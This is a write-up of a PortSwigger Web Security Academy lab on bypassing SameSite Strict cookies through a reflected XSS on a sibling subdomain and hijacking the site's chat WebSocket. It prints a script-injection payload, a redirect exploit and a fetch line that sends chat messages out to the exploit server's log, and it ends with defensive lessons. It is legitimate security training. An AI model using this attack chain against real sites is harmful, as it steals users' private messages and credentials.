# PortSwigger Lab — SameSite Strict Bypass via Sibling Domain

**Lab:** SameSite Strict bypass via sibling domain
**Category:** Cross-Site Request Forgery (CSRF) / Cross-Site WebSocket Hijacking (CSWSH)
**Difficulty:** PRACTITIONER
**Lab page:** https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
**Instance:** https://0a52001e0309d9048159b67900c60042.web-security-academy.net/
**Solved:** 26 November 2026 — logged in as the victim (carlos) with credentials found in the victim's live-chat history; verified "Congratulations, you solved the lab!" banner on the instance home page.

## Vulnerability Type
Cross-Site WebSocket Hijacking — the live chat WebSocket (`wss://<instance>/chat`) has no authentication token, and the session cookie is `SameSite=Strict`, so it cannot be reached cross-site. A sibling subdomain (`cms-<instance>.web-security-academy.net`) has a reflected XSS in its login `username` parameter, and a subdomain counts as same-site for cookies, so a script running on the sibling domain reaches the chat with the victim's cookie.

## Objective
Steal the victim's (carlos's) credentials from the live chat history and log in as the victim.

## Solution
1. Confirmed the sibling XSS: `GET https://cms-<instance>.web-security-academy.net/login?username=<script>alert(1)</script>&password=x` reflects the script unencoded.
2. Confirmed the chat works over WebSocket as `wiener:peter` (send `READY`, receive history).
3. Stored this exploit on the lab's exploit server — it navigates the victim to the sibling login URL with a URL-encoded CSWSH script as the `username`:
   `<script>document.location = "https://cms-<instance>.web-security-academy.net/login?username=<URL-ENCODED-SCRIPT>&password=x";</script>`
   The script opens `wss://<instance>/chat`, sends `READY`, and exfiltrates each chat message to the exploit server's access log with `fetch('<exploit-server>/?d=' + encodeURIComponent(event.data))`. (No Burp Collaborator is available in this environment, so the exploit server's own access log was used as the exfiltration channel.)
4. Clicked "Deliver exploit to victim". The victim's browser ran the script on the sibling domain, the chat history was exfiltrated to the access log, and it contained: Hal Pline to carlos — "No problem carlos, it's `lg8f4i3b2x5kdtb1w9zf`".
5. Logged in as `carlos` with that password. The home page banner confirmed the lab solved.

## Practical Explanation
SameSite=Strict protects the main domain, but cookies are shared across subdomains: any XSS on any sibling subdomain runs with the victim's session. The chat WebSocket trusted the cookie alone with no per-connection token, so a script on the sibling domain could read the victim's private chat. Defence in depth: WebSockets need their own unpredictable token, subdomains must be kept XSS-free, and sensitive data (like a password in chat) should never be shared in a support chat at all.

## Lessons Learned
- A sibling subdomain XSS is as good as an XSS on the main site when cookies are shared — map every subdomain, not just the main app.
- WebSockets without a token are CSRF-able (CSWSH) the same way plain endpoints are.
- When no Collaborator is available, the lab's own exploit-server access log works as an exfiltration channel — but the log is a form button (`ACCESS_LOG`), not a link, so it must be read by posting the form.
- The victim did exfiltrate on the first run, but the solver could not see it because it looked for a log link that does not exist — always verify how the log is actually reached.
